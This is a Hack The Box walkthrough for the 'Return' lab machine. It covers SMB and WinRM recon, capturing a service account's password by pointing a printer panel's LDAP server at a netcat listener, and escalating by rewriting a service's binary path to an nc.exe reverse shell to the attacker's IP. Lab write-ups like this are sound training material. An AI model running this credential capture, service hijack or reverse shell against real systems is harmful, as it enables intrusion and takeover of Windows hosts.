# HTB - Return

**IP Address:** `10.10.11.108`  
**OS:** Windows Server 2019  
**Difficulty:** Medium  
**Tags:** SMB, WinRM, Web Panel, LDAP Injection, Service Abuse, Reverse Shell

---

## 1. Initial Recon

### 1.1 Ping Test

✅ Host is up

### 1.2 Nmap Scanning

```bash
nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664-49696 10.10.11.108 -oN targeted
```

Found typical AD ports and open WinRM port (`5985`).

---

## 2. SMB Info

```bash
crackmapexec smb 10.10.11.108
```

Revealed:

- OS: Windows Server 2019 Build 17763
- Hostname: `PRINTER`
- Domain: `return.local`

Anonymous SMB access failed — credentials required.

---

## 3. Web Panel & Credential Leak

Accessed `http://10.10.11.108` in browser.

Settings panel allowed configuring an LDAP server.

Set our IP in the panel and launched a listener:

```bash
nc -nlvp 389
```

Triggered upload → intercepted request containing credentials:

- **User**: `svc-printer`  
- **Password**: `1edFg43012!!`

---

## 4. WinRM Access

Verified credentials:

```bash
crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
```

✅ WinRM access confirmed

Logged in:

```bash
evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
```

🏁 **User flag obtained**

---

## 5. Privilege Escalation

Checked privileges:

```bash
whoami /priv
```

Checked group:

```bash
net user svc-printer
```

Belongs to **Remote Management Users** — can manage services.

Listed services:

```bash
services
```

Uploaded `nc.exe` to victim's desktop via Evil-WinRM.

---

## 6. Modifying an Existing Service

Identified editable service: `VMTools`

Modified its binary path:

```bash
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.14 443"
```

Started listener:

```bash
nc -nlvp 443
```

Restarted service:

```bash
sc.exe stop VMTools
sc.exe start VMTools
```

✅ Reverse shell received  
🏁 **Root flag obtained**

---

# ✅ MACHINE COMPLETE
